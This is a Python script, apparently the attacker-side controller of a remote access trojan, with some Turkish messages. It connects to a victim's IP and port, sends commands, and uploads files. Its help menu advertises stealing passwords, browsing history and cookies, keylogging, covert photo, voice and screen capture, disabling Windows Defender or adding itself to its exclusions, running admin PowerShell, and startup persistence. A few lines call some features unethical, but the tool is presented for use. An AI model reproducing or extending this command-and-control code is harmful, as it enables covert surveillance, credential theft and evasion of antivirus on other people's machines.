import socket, time, tqdm
from colorama import Fore

host = input("Enter IP adress : ")
try:
    port = int(input("Enter port number : "))
except ValueError:
    print("Value Error!")

while True:
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((host, port))

        message = input("Enter message : ")

        while True:
            if (message != ""):
                client_socket.send(message.encode())
                data = client_socket.recv(51200).decode()
                print(f"Mesaj : {data}")
            message = input("Enter message : ")
            if message == "quit" or message == "exit":
                client_socket.send("quit".encode())
                exit()

            elif message == "password" or message == "pw":
                print("Lütfen bilgiler geldikten sonra 2 saniye komut girmeyin!")

            elif message.startswith("upload "):
                data = message[7:]
                try:
                    with open(message, "rb") as file:
                        client_socket.sendfile(file)
                        print(f"{Fore.GREEN}Succsesfully to sent!{Fore.RESET}")
                except Exception as e:
                    print(f"{Fore.RED}Error! {e}{Fore.RESET}")

            elif message == "help":
                print("help or --help: Print the help message")
                print("ls: List files and directories in the current path")
                print("mkdir: Create a new directory")
                print("rmdir: Delete a directory")
                print("cat: Display the contents of a file")
                print("pwd: Show the current working directory")
                print("touch: Create a new file")
                print("ifconfig or ipconfig: Display the IP address information")
                print("password: Steal passwords (Note: This line is inappropriate and unethical)")
                print("history: Steal browsing history (Note: This line is inappropriate and unethical)")
                print("cookie: Steal cookies (Note: This line is inappropriate and unethical)")
                print("cp: Capture a photo")
                print("ss or screenshot: Take a screenshot")
                print("vc or voice: Record voice")
                print("kill: Terminate programs")
                print("ps: List running processes")
                print("open: Open an application")
                print("hide: Hide an application or file")
                print("unhide: Unhide an application or file")
                print("rename: Rename an application or file")
                print("startup: Configure startup settings")
                print("download: Download a file")
                print("upload: Upload a file")
                print("shutdown: Shutdown the computer")
                print("restart: Restart the computer")
                print("shell: Activate shell code")
                print("cmd: Activate CMD code")
                print("web: Open a website")
                print("web_background: Open a website in the background")
                print("keylogger: Enable keylogger (Note: This line is inappropriate and unethical)")
                print("type: Type on the keyboard")
                print("press: Press a key on the keyboard (English words only)")
                print("moveto: Move the mouse based on user input")
                print("click: Click the mouse")
                print("defender_off: Turns off Windows Defender (admin privilege required)")
                print("defender_on: Turns on Windows Defender (admin privilege required)")
                print("exclusion: Windows Defender adds itself to exclusions (admin privilege required)")
                print("admin_shell: Runs PowerShell code as admin (admin privilege required)")
                print("clipboard: Show the contents of the clipboard")

        client_socket.close()
    except Exception as e:
        print(f"{Fore.RED}Hata {e} 2 saniye sonra {host}:{port} üzerinden tekrar deneniyor...{Fore.RESET}")
        time.sleep(2)
    finally:
        client_socket.close()